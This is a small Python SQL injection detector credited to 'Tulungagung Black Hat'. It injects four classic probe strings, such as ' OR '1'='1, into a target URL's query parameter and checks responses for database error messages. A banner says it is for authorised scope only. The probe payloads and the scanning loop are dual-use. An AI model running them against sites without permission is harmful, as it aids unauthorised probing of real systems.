#!/usr/bin/env python3
# TBH-SQLi - Detector (Educational - Safe Payload)
import requests, argparse, json, urllib.parse, time

BANNER = """\033[91m╔════════════════════════════════════╗
\033[91m║ \033[97mTBH-SQLi \033[91m- Detector               \033[91m║
\033[91m║ \033[90mTulungagung Black Hat | uchil404 \033[91m║
\033[91m╚════════════════════════════════════╝\033[0m"""

PAYLOADS = ["'","\"","' OR '1'='1","\" OR \"1\"=\"1"]

def check(url):
    parsed=urllib.parse.urlparse(url)
    qs=urllib.parse.parse_qs(parsed.query)
    results=[]
    for payload in PAYLOADS:
        if not qs:
            test_url=f"{url}?id={urllib.parse.quote(payload)}"
        else:
            k=list(qs.keys())[0]
            qs[k]=payload
            test_url=urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)))
        try:
            start=time.time()
            r=requests.get(test_url,timeout=5,headers={'User-Agent':'TBH-SQLi/1.0'})
            elapsed=time.time()-start
            # Simple error based detection
            error_indicators=["sql syntax","mysql","syntax error","unclosed quotation","ORA-","PostgreSQL"]
            vulnerable=any(ind.lower() in r.text.lower() for ind in error_indicators)
            time_based=elapsed>4  # If delay
            results.append({"payload":payload,"url":test_url,"status":r.status_code,"vulnerable":vulnerable,"time":round(elapsed,2)})
            if vulnerable: break
        except: results.append({"payload":payload,"error":True,"vulnerable":False})
    return results

def main():
    print(BANNER)
    print("\033[91m[!] Hanya untuk scope yang diizinkan! Payload aman.\033[0m\n")
    parser=argparse.ArgumentParser(description="SQLi")
    parser.add_argument("-u","--url",required=True)
    parser.add_argument("--json",help="Save JSON")
    args=parser.parse_args()
    print(f"[*] Testing {args.url} dengan {len(PAYLOADS)} payloads")
    results=check(args.url)
    for r in results:
        if r.get("vulnerable"): print(f"\033[91m[!] Vulnerable! {r['payload']} -> {r['url']} [{r['status']}]\033[0m")
        else: print(f"\033[90m[-] {r['payload']} -> {r.get('status','err')} not vulnerable\033[0m")
    if any(x["vulnerable"] for x in results): print("\033[91m[!] Potensi SQLi High!\033[0m")
    else: print("\033[92m[✓] Tidak terdeteksi SQLi error-based\033[0m")
    if args.json:
        open(args.json,'w').write(json.dumps(results,indent=2)); print(f"[✓] JSON: {args.json}")

if __name__=="__main__": main()
